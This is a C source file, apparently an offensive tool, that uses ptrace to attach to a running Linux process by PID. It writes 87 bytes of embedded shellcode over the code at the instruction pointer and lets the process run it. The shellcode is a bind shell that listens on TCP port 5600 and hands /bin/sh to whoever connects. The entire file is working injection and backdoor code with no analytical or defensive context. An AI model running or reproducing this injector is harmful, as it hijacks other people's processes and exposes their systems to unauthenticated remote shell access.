#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 87

unsigned char *shellcode = 
    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a"
    "\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66"
    "\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58"
    "\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a"
    "\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0"
    "\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62"
    "\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0"
    "\x3b\x0f\x05";

int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
    int i;
    uint32_t *s = (uint32_t *) src;
    uint32_t *d = (uint32_t *) dst;

    for (i = 0; i < len; i += 4, s++, d++) {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
            perror("ptrace(POKETEXT):");
            return -1;
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    pid_t target;
    struct user_regs_struct regs;
    int syscall;
    long dst;

    if (argc != 2) {
        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
        exit(1);
    }

    target = atoi(argv[1]); // Get the process Id
    printf("+ Tracing process %d\n", target);
    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
        perror("ptrace (ATTACH):");
        exit(1);
    }

    printf("+ Waiting for process ... \n");
    wait(NULL);

    printf("+ Getting Registers ... \n");
    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
        perror("ptrace (GETREGS):");
        exit(1);
    }

    printf("+ Injecting shell code at %p\n", (void*)regs.rip);
    inject_data(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
    regs.rip += 2;

    printf("+ Setting instruction pointer to %p\n", (void *)regs.rip);
    if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("+ Run It!\n");

    if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
        perror("ptrace(DETACH):");
        exit(1);
    }

    return 0;
}